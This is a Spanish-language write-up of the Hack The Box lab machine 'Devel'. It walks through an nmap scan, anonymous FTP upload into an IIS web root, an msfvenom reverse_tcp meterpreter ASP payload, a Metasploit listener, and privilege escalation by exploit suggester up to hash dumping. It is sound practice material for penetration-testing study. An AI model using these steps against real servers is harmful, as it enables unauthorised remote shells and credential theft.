# 4 - Devel \(win\_easyish\) - Msfvenom

```text
nmap -T4 -p- -A -sS 10.10.10.5
```

![](../../.gitbook/assets/imagen%20%28528%29.png)

De ahi vemos que tienen levantada la pagina por defecto de IIS. Entonces a si tienen eso levantado que mas tienen levantado?

## Dirbuster

![](../../.gitbook/assets/imagen%20%28517%29.png)

## FTP

Como tiene anonymous login ingresamos eso mismo como user y pass.

Probemos bajar una imagen random, suponer dog.jpeg y tratar de pasarsela al servidor via fpt ya que esta abierto el puerto.

```text
put dog.jpeg
```

Con eso luego entramos desde la web y esta ahi, en 10.10.10.5:80/dog.jpg

Si no podemos ejecutar el codigo de lo que pongamos no sirve de mucho el que ftp este expuesto, pero como el server lo lee desde la web si es potencialmente malicioso.

Usemos msfvenom:

```text
msfvenom -p windows/meterpreter/reverse_tcp LHOST= LPORT= -f asp > shell.asp
```

Ponemos el payload en un archivo  que subiremos al ftp

![](../../.gitbook/assets/imagen%20%28530%29.png)

Necesitaremos usar eso desde **metasploit**

![](../../.gitbook/assets/imagen%20%28523%29.png)

![](../../.gitbook/assets/imagen%20%28535%29.png)

Aqui preparamos nuestro listening para tomar la consola. Desde FTP le pasamos el archivo que generamos antes **ex.aspx**

![](../../.gitbook/assets/imagen%20%28534%29.png)

**Privilege escalation**

**N**o estan sencillo pero como en esa shell que reventamos no somos figura auth, debemos escalar los privilegios, para esto busca un suggester que le ayuda a automatizar el proceso, luego pide session y hace todo solo.

![](../../.gitbook/assets/imagen%20%28536%29.png)

![](../../.gitbook/assets/imagen%20%28527%29.png)

![](../../.gitbook/assets/imagen%20%28531%29.png)

Con eso se consigue la auth figure y podemos ver los hashdumps..

